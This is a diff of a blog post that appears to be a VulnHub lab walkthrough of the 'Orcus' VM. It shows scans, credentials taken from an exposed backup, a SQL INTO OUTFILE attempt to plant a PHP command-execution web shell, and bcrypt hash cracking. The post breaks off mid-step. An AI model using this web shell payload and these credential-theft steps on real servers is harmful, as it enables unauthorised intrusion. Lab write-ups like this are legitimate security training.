@@ -1,12 +1,986 @@
 ---
 layout: post
-title:  "hackfest2016 : Orcus"
-date:   2019-04-15 00:34:01 +0000
+title: "hackfest2016 : Orcus"
+date: 2019-04-15 00:34:01 +0000
 author: Larry Brown
 category: Walkthroughs
 tags: [vulnhub]
 ---
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-
-<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-04-15 00:34:01 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-05-16 22:03:13 +0000" name="updated"/><title>hackfest2016 : Orcus</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/hackfest2016-orcus,182/" target="_blank">https://www.vulnhub.com/entry/hackfest2016-orcus,182/</a></div><div>Hostname: orcus</div><div>IP Address: 10.183.0.220</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.220.</div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# nmap -Pn -sT -sV -A -p 1-65535 -oA orcus 10.183.0.220</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-16 11:24 EDT</div><div>Nmap scan report for Orcus.homenet.dom (10.183.0.220)</div><div>Host is up (0.0033s latency).</div><div>Not shown: 65519 closed ports</div><div>PORT      STATE SERVICE     VERSION</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</font></div><div>| ssh-hostkey:</div><div>|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)</div><div>|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)</div><div>|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">53/tcp    open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)</font></div><div>| dns-nsid:</div><div>|_  bind.version: 9.10.3-P4-Ubuntu</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))</font></div><div>| http-robots.txt: 30 disallowed entries (15 shown)</div><div>| /exponent.js.php /exponent.js2.php /exponent.php</div><div>| /exponent_bootstrap.php /exponent_constants.php /exponent_php_setup.php</div><div>| /exponent_version.php /getswversion.php /login.php /overrides.php</div><div>| /popup.php /selector.php /site_rss.php /source_selector.php</div><div>|_/thumb.php</div><div>|_http-server-header: Apache/2.4.18 (Ubuntu) </div><div>|_http-title: Site doesn't have a title (text/html).</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">110/tcp   open  pop3        Dovecot pop3d</font></div><div>|_pop3-capabilities: CAPA PIPELINING UIDL AUTH-RESP-CODE SASL RESP-CODES STLS TOP</div><div>|_ssl-date: TLS randomness does not represent time</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp   open  rpcbind     2-4 (RPC #100000)</font></div><div>| rpcinfo:</div><div>|   program version   port/proto  service</div><div>|   100000  2,3,4        111/tcp  rpcbind</div><div><div>|   100000  2,3,4        111/udp  rpcbind</div><div>|   100003  2,3,4       2049/tcp  nfs</div><div>|   100003  2,3,4       2049/udp  nfs</div><div>|   100005  1,2,3      46869/udp  mountd</div><div>|   100005  1,2,3      52432/tcp  mountd</div><div>|   100021  1,3,4      42413/tcp  nlockmgr   </div><div>|   100021  1,3,4      48272/udp  nlockmgr   </div><div>|   100227  2,3         2049/tcp  nfs_acl</div><div>|_  100227  2,3         2049/udp  nfs_acl</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">143/tcp   open  imap        Dovecot imapd</font></div><div>|_imap-capabilities: STARTTLS more OK Pre-login IDLE have LOGINDISABLEDA0001 listed LITERAL+ ENABLE post-login capabilities ID IMAP4rev1 LOGIN-REFERRALS SASL-IR</div><div>|_ssl-date: TLS randomness does not represent time</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">443/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</font></div><div>| ssh-hostkey:</div><div>|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)</div><div>|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)</div><div>|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">993/tcp   open  ssl/imaps?</font></div><div>|_ssl-date: TLS randomness does not represent time</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">995/tcp   open  ssl/pop3s?</font></div><div>|_ssl-date: TLS randomness does not represent time</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">2049/tcp  open  nfs_acl     2-3 (RPC #100227)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">42413/tcp open  nlockmgr    1-4 (RPC #100021)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">44598/tcp open  mountd      1-3 (RPC #100005)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">46296/tcp open  mountd      1-3 (RPC #100005)</font></div><div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">52432/tcp open  mountd      1-3 (RPC #100005)</font></div><div>MAC Address: 08:00:27:96:F8:7B (Oracle VirtualBox virtual NIC)</div><div>Device type: general purpose</div><div>Running: Linux 3.X|4.X</div><div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div><div>OS details: Linux 3.2 - 4.9</div><div>Network Distance: 1 hop</div><div>Service Info: Host: ORCUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</div><div><div><br/></div><div><br/></div></div><div>Host script results:</div><div>|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s</div><div>|_nbstat: NetBIOS name: ORCUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div><div>| smb-os-discovery:</div><div>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</div><div>|   Computer name: orcus</div><div>|   NetBIOS computer name: ORCUS\x00</div><div>|   Domain name: homenet.dom</div><div>|   FQDN: orcus.homenet.dom</div><div>|_  System time: 2019-04-16T11:25:14-04:00   </div><div>| smb-security-mode:</div><div>|   account_used: guest</div><div>|   authentication_level: user</div><div>|   challenge_response: supported</div><div>|_  message_signing: disabled (dangerous, but default)</div><div>| smb2-security-mode:</div><div>|   2.02:</div><div>|_    Message signing enabled but not required</div><div>| smb2-time:</div><div>|   date: 2019-04-16 11:25:14</div><div>|_  start_date: N/A</div><div><div><br/></div><div><br/></div></div><div>TRACEROUTE</div><div>HOP RTT     ADDRESS</div><div>1   3.33 ms Orcus.homenet.dom (10.183.0.220) </div><div><div><br/></div><div><br/></div></div><div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div>Nmap done: 1 IP address (1 host up) scanned in 249.71 seconds</div></div></div></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div>Ran nikto against the HTTP service on TCP port 80.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# nikto -h http://10.183.0.220</div><div>- Nikto v2.1.6</div><div>---------------------------------------------------------------------------</div><div>+ Target IP:          10.183.0.220</div><div>+ Target Hostname:    10.183.0.220</div><div>+ Target Port:        80</div><div>+ Start Time:         2019-04-16 11:57:51 (GMT-4)</div><div>---------------------------------------------------------------------------</div><div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div><div>+ The anti-clickjacking X-Frame-Options header is not present.</div><div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME t</div><div>ype</div><div>+ Cookie PHPSESSID created without the httponly flag</div><div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div><div>+ Entry '/exponent.js.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/exponent.js2.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/exponent.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/exponent_bootstrap.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/exponent_constants.php' in robots.txt returned a non-forbidden or redirect HTTP code (500)</div><div>+ Entry '/exponent_php_setup.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/exponent_version.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/getswversion.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/login.php' in robots.txt returned a non-forbidden or redirect HTTP code (302)</div><div>+ Entry '/overrides.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/selector.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/site_rss.php' in robots.txt returned a non-forbidden or redirect HTTP code (302)</div><div>+ Entry '/source_selector.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/thumb.php' in robots.txt returned a non-forbidden or redirect HTTP code (302)</div><div>+ Entry '/ABOUT.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/CHANGELOG.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/CREDITS.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/INSTALLATION.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/README.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/RELEASE.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ Entry '/TODO.md' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div><div>+ OSVDB-3268: /files/: Directory indexing found.</div><div>+ Entry '/files/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ OSVDB-3268: /tmp/: Directory indexing found.</div><div>+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div><div>+ "robots.txt" contains 30 entries which should be manually viewed.</div><div>+ Server may leak inodes via ETags, header found with file /, inode: 65, size: 53ff6086e56aa, mtime: gzip</div><div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div><div>+ Multiple index files found: /index.html, /index.php</div><div>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS</div><div>+ OSVDB-2870: /index.php?download=/etc/passwd: Snif 1.2.4 allows any file to be retrieved from the web server.</div><div>+ OSVDB-59085: /index.php?|=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.</div><div>+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)</div><div>+ OSVDB-59085: /index.php?l=forum/view.php&amp;topic=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.</div><div>+ OSVDB-8193: /index.php?module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc/&amp;view=passwd: EW FileManager for PostNuke allows arbitrary file retrieval.</div><div>+ OSVDB-3092: /admin/: This might be interesting...</div><div>+ OSVDB-3092: /files/: This might be interesting...</div><div>+ Uncommon header 'x-ob_mode' found, with contents: 1</div><div>+ OSVDB-3092: /tmp/: This might be interesting...</div><div>+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.</div><div>+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.</div><div>+ OSVDB-3233: /icons/README: Apache default file found.</div><div>+ OSVDB-3092: /test.php: This might be interesting...</div><div>+ <font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">/phpmyadmin/</font>: phpMyAdmin directory found   </div><div>+ 9718 requests: 0 error(s) and 48 item(s) reported on remote host</div><div>+ End Time:           2019-04-16 11:59:17 (GMT-4) (86 seconds)</div><div>---------------------------------------------------------------------------</div><div>+ 1 host(s) tested</div></div></div><div><br/></div><div>Checked several of the paths returned from nikto with 200 responses. From the following URLs (among others), I can tell the server is using the Exponent Content Management System (version <span style="letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; overflow-wrap: break-word; white-space: pre-wrap; color: rgb(0, 0, 0); font-variant-caps: normal; font-variant-ligatures: normal;">2.3.9).</span></div><div><br/></div><div><a href="http://10.183.0.220/CHANGELOG.md" style="--inversion-type-color:  simple;">http://10.183.0.220/CHANGELOG.md</a></div><div><a href="http://10.183.0.220/getswversion.php">http://10.183.0.220/getswversion.php</a></div><div><a href="http://10.183.0.220/install/changes/">http://10.183.0.220/install/changes/</a></div><div><br/></div><div>The exploit database reports a Blind SQL Injection vulnerability for this version of Exponent CMS.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Exponent CMS 2.3.9 - Blind SQL Injection                                                                     | exploits/php/webapps/40412.txt</div></div><div><br/></div><div>This would be great, but browsing to /index.php reveals the database for Exponent is "Off-line". You can't do SQL injection on a database that isn't available. 😞</div><div><br/></div><div><img height="338" src="/assets/images/2019-04-15-hackfest2016-orcus/D6BB1B27-53AE-4817-96BE-962B4BF9F35C.png" width="1878"/><br/></div><div><br/></div><div>The /external path is listable and contains many applications, several of which have known vulnerabilities. Unfortunately, many aren't set up or at least aren't clearly accessible (since Exponent isn't really running).</div><div><br/></div><div><img height="1426" src="/assets/images/2019-04-15-hackfest2016-orcus/8CD34599-91A3-4BCC-80BE-BB784E7D0097.png" width="1032"/><br/></div><div><br/></div><div>I use wget to mirror the /external directory so I can search for .php files that might return content. While that started downloading, I took note of the 'adminer' directory.</div><div><br/></div><div><img height="726" src="/assets/images/2019-04-15-hackfest2016-orcus/85774931-600B-4708-A925-E4061BFF829A.png" width="908"/><br/></div><div><br/></div><div>The 'admin.php' file only returns a page saying I need to be logged in to Exponent. The 'adminer-4.2.5-mysql.php', however, gives me a login page to manage the backend database.</div><div><br/></div><div><img height="704" src="/assets/images/2019-04-15-hackfest2016-orcus/FD8FFEE6-0BF0-49FD-8C10-900B4DAB0C3F.png" width="1112"/><br/></div><div><br/></div><div>Nikto also reported the server has phpMyAdmin available at /phpmyadmin.</div><div><br/></div><div><img height="1024" src="/assets/images/2019-04-15-hackfest2016-orcus/7EA539E0-7804-4276-9AC9-75B22252C385.png" width="800"/><br/></div><div><br/></div><div>Except for these login interfaces to manage the database, most of what nikto reported seems to be a dead end. Let's run dirb to see if there are any other sites hosted on the server that might provide a way in.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>dirb http://10.183.0.220 /usr/share/dirb/wordlists/big.txt -o dirb-http-10.183.0.220.txt</div></div><div><br/></div><div>Stepping through each directory found by dirb...</div><div><br/></div><div>The /admin directory doesn't return anything; however, the /backups directory is listable and has a couple of files.</div><div><br/></div><div><img height="458" src="/assets/images/2019-04-15-hackfest2016-orcus/2401A980-E9BF-40C4-9239-E0DCB2345954.png" width="988"/><br/></div><div><br/></div><div>Backups are notorious for containing sensitive information from files in locations that typically wouldn't be accessible remotely. Let's see what we've got.</div><div><br/></div><div>Unfortunately, access to the 'ssh-creds.bak' file is "Forbidden". That would be too easy.</div><div><br/></div><div>However, downloading and browsing through the 'SimplePHPQuiz-Backupz.tar.gz' archive, we've found some database credentials.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# wget "http://10.183.0.220/backups/SimplePHPQuiz-Backupz.tar.gz"</div><div>root@kali:~/Walkthroughs/hackfest2016/orcus# tar zxf SimplePHPQuiz-Backupz.tar.gz </div><div>root@kali:~/Walkthroughs/hackfest2016/orcus# cd SimplePHPQuiz/</div><div>root@kali:~/Walkthroughs/hackfest2016/orcus/SimplePHPQuiz# grep -ri 'password' * | cut -d ':' -f 1 | sort -u</div><div>css/bootstrap.css.map</div><div>includes/db_conn.php</div><div>root@kali:~/Walkthroughs/hackfest2016/orcus/SimplePHPQuiz# cat includes/db_conn.php</div><div>&lt;?php </div><div><div><br/></div><div><br/></div></div><div>//Set the database access information as constants</div><div>DEFINE ('DB_USER', 'dbuser');</div><div>DEFINE ('DB_PASSWORD', 'dbpassword');</div><div>DEFINE ('DB_HOST', 'localhost');</div><div>DEFINE ('DB_NAME', 'quizdb');</div><div><div><br/></div><div><br/></div></div><div>@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);</div><div><div><br/></div><div><br/></div></div><div>if (mysqli_connect_error()){</div><div>        echo "Could not connect to MySql. Please try again";</div><div>        exit();</div><div>}</div><div><div><br/></div><div><br/></div></div><div>?&gt;</div></div><div><br/></div><div>Now that we have some database credentials, let's go try them on the phpMyAdmin login page.</div><div><br/></div><div><img height="1454" src="/assets/images/2019-04-15-hackfest2016-orcus/A2868DA7-5B21-4EAC-AD7C-A219E28456A0.png" width="2660"/><br/></div><div><br/></div><div>They worked! :]</div><div><br/></div><div>Looks like we are running<font face="Helvetica Neue" style="font-size: 14px;"> phpM<font>yAdmin version <span style="letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(243, 243, 243); color: rgb(68, 68, 68); font-variant-caps: normal; font-variant-ligatures: normal;">4.5.4.1deb2ubuntu2. Let's </span></font><span style="letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(243, 243, 243); color: rgb(68, 68, 68); font-variant-caps: normal; font-variant-ligatures: normal;">check the exploit database for known vulnerabilities. Surprisingly, nothing for version 4.5.</span></font></div><div><br/></div><div>Browsing to the 'mysql/user' table, we see that our 'dbuser' account has all the permissions we'll ever need, so no need to try to brute force any of the other accounts.</div><div><br/></div><div><img height="546" src="/assets/images/2019-04-15-hackfest2016-orcus/58BDC630-7B18-404B-B6F0-595A9EA22894.png" width="2166"/><br/></div><div><br/></div><div>Let's see if we can use/abuse phpMyAdmin to upload some PHP code that will allow us to execute arbitrary commands on the server. We'll assume the server is hosting files out of the default '/var/www/html' directory. We select first database in the list (Adem) and go to the SQL tab to run our sql command. We are going to try to create a 'cmd.php' file in the root of /var/www/html that has PHP code that takes a query string parameter called 'cmd' and executes it on the server.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE "/var/www/html/cmd.php"</div></div><div><br/></div><div><img height="1046" src="/assets/images/2019-04-15-hackfest2016-orcus/C6387FDA-926A-4FF4-9568-779A58E26E3D.png" width="2656"/><br/></div><div><br/></div><div>After hitting Go, we get an error. Looks like the MySQL server has been properly configured to only allow files to be written to a well defined location.</div><div><br/></div><div><img height="452" src="/assets/images/2019-04-15-hackfest2016-orcus/DB6F7349-9050-473A-BBF4-3CE80DE73B46.png" width="1420"/><br/></div><div><br/></div><div>I run the following command to see what the secure location is.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>SHOW VARIABLES LIKE "secure_file_priv";</div></div><div><br/></div><div><img height="106" src="/assets/images/2019-04-15-hackfest2016-orcus/2152D89A-7FDB-4B4A-8B32-4ADB6FB6493A.png" width="464"/><br/></div><div><br/></div><div>Well, so much for that. It is doubtful the web server can access any files written to '/var/lib/mysql-files'. Moving on...</div><div><br/></div><div>Most of the other databases seem to be empty. The only one that has content is 'zencart'.</div><div><br/></div><div>The 'admin' table in the zencart database has a user named 'admin' with a current password hash and a previous password hash. Let's try to crack the hashes with john.</div><div><br/></div><div><img height="112" src="/assets/images/2019-04-15-hackfest2016-orcus/AC13F543-9E34-4AA8-ACD6-76ED6CE6D3FB.png" width="2166"/><br/></div><div><br/></div><div>I create a file with the two hashes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# cat zencart-admin </div><div>admin:$2y$10$W7Leeizto5Pc9tXCVlEgFOlcbjHeaOPoUsRqwl4xmTzhrKR52vDf.</div><div>admin_old:$2y$10$P7YrX.VgZXRkFI/990aQnencu8IxU5B2l/O6Zqo.xVU832f4Ykesm</div></div><div><br/></div><div>I use john to crack them.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# john --single zencart-admin</div><div>Using default input encoding: UTF-8</div><div>Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])</div><div>admin123         (admin)</div><div>1g 0:00:05:33 DONE (2019-04-16 13:28) 0.002999g/s 37.77p/s 37.78c/s 37.78C/s old1900..oadmin1900</div><div>Use the "--show" option to display all of the cracked passwords reliably</div><div>Session completed</div></div><div><br/></div><div>Looks like the current password was cracked (using the most basic cracking method --single), but not the previous one. I tried to SSH to the host using 'root:admin123' and 'admin:admin123'. Neither worked, but it was worth a shot. The server also doesn't seem to have a /zencart directory, so maybe this is just a red herring. We'll see if this password can be used somewhere else later.</div><div><br/></div><div>Now, back to stepping through the found directories...</div><div><br/></div><div>Accessing /zenphoto redirects us to a "Zenphoto Setup" page. The setup page shows an error with the database configuration.</div><div><br/></div><div><img height="814" src="/assets/images/2019-04-15-hackfest2016-orcus/F45F284C-3209-4FB4-9617-413B1404617E.png" width="1664"/><br/></div><div><br/></div><div>Before messing too much with this, I check the exploit database to see if Zenphoto is a typically vulnerable piece of software and...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/orcus# searchsploit zenphoto</div><div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div><div> Exploit Title                                                                                               |  Path</div><div>                                                                                                             | (/usr/share/exploitdb/)</div><div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div><div>ZenPhoto - 'admin-news-articles.php' Cross-Site Scripting                                                    | exploits/php/webapps/37903.txt</div><div>ZenPhoto - 'index.php' SQL Injection                                                                         | exploits/php/webapps/38326.txt</div><div>ZenPhoto - Config Update / Command Execution                                                                 | exploits/php/webapps/15114.php</div><div>ZenPhoto - SQL Injection                                                                                     | exploits/php/webapps/39062.txt</div><div>ZenPhoto 0.9/1.0 - 'i.php?a' Cross-Site Scripting                                                            | exploits/php/webapps/27795.txt</div><div>ZenPhoto 0.9/1.0 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                 | exploits/php/webapps/27796.txt</div><div>ZenPhoto 1.1.3 - 'rss.php?albumnr' SQL Injection                                                             | exploits/php/webapps/4823.pl</div><div>ZenPhoto 1.2.5 - Completely Blind SQL Injection                                                              | exploits/php/webapps/9154.js</div><div>ZenPhoto 1.3 - '/zp-core/admin.php' Multiple Cross-Site Scripting Vulnerabilities                            | exploits/php/webapps/34611.txt</div><div>ZenPhoto 1.3 - '/zp-core/full-image.php?a' SQL Injection                                                     | exploits/php/webapps/34610.txt</div><div>ZenPhoto 1.4.0.3 - '_zp_themeroot' Multiple Cross-Site Scripting Vulnerabilities                             | exploits/php/webapps/35648.txt</div><div>ZenPhoto 1.4.0.3 - x-forwarded-for HTTP Header Persistent Cross-Site Scripting                               | exploits/php/webapps/17200.txt</div><div>ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                            | exploits/php/webapps/18083.php</div><div>ZenPhoto 1.4.10 - Local File Inclusion                                                                       | exploits/php/webapps/38841.txt</div><div>ZenPhoto 1.4.11 - Remote File Inclusion                                                                      | exploits/php/webapps/39571.txt</div><div>ZenPhoto 1.4.3.3 - Multiple Vulnerabilities                                                                  | exploits/php/webapps/22524.txt</div><div>ZenPhoto 1.4.8 - Multiple Vulnerabilities                                                                    | exploits/php/webapps/37602.txt</div><div>ZenPhoto CMS 1.3 - Multiple Cross-Site Request Forgery Vulnerabilities                                       | exploits/php/webapps/14359.html</div><div>ZenPhoto Gallery 1.2.5 - Admin Password Reset (Cross-Site Request Forgery)                                   | exploits/php/webapps/9166.txt</div><div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div><div>Shellcodes: No Result</div></div><div><br/></div><div>YES! Yes, it is. 🙂</div><div><br/></div><div>Since we know we have valid database credentials (that are fully privileged), we decide we should get Zenphoto up and running.</div><div><br/></div><div>We enter our database credentials and click Save.</div><div><br/></div><div><img height="1250" src="/assets/images/2019-04-15-hackfest2016-orcus/73B348EE-B142-4AF5-BA7B-37B9BE9D61C2.png" width="1668"/><br/></div><div><br/></div><div>When the page refreshes, it looks like everything is green and good to Go... so we click Go...</div><div><br/></div><div><img height="1370" src="/assets/images/2019-04-15-hackfest2016-orcus/F050F291-48FD-4475-B346-D2ED9F942E16.png" width="1646"/><br/></div><div><br/></div><div>The next step appears to be setting my "admin user and password"...</div><div><br/></div><div><img height="870" src="/assets/images/2019-04-15-hackfest2016-orcus/F5195B27-4118-45EB-8709-A5DC5D00B691.png" width="1658"/><br/></div><div><br/></div><div>After agreeing to the terms and conditions, of course...</div><div><br/></div><div><img height="494" src="/assets/images/2019-04-15-hackfest2016-orcus/310197D0-44C3-4909-87F8-A7D943F2908A.png" width="712"/><br/></div><div><br/></div><div>I fill out my admin details and click Apply</div><div><br/></div><div><img height="1348" 